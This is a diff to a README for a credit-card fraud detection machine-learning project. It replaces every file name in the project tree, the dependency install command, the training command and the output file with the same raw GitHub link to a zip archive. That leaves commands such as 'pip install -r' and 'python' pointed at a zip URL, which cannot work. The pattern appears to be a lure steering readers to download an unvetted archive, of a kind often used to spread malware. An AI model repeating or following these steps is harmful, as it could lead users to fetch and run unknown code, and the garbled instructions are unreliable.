@@ -30,11 +30,11 @@ Credit-Card-Fraud-Detection/
 
 ├── Data/
 
-│    ├── newtrain.csv
+│    ├── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
-│    ├── val.csv
+│    ├── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
-│    └── test.csv
+│    └── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
 │
 
@@ -44,18 +44,18 @@ Credit-Card-Fraud-Detection/
 
 ├── Modeling/                → Python scripts for training & testing
 
-│    ├── credit_fraud_train.py
+│    ├── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
-│    ├── credit_fraud_test.py
+│    ├── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
-│    └── credit_fraud_utils_data.py
+│    └── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
 │
-├── requirements.txt         → Python dependencies
+├── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip         → Python dependencies
 
-├── README.md                → You are here
+├── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip                → You are here
 
-└── results.docx             → Model results summary
+└── https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip             → Model results summary
 
 
 
@@ -89,14 +89,14 @@ venv\Scripts\activate
 
 2️⃣ Install dependencies
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
 
 🚀 How to Run Training
 
 Our Final Model 
 
-python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train Data/newtrain.csv --val Data/val.csv
+python https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip --model RandomForest --scaler StandardScaler --train https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip --val https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
 
 You can also try other arguments
@@ -176,7 +176,7 @@ Class weighting (model-based)
 📁 Output Files
 
 After training, the project outputs:
-model.joblib            →trained model and best threshold  
+https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip            →trained model and best threshold  
 
 
 🧩 Future Improvements
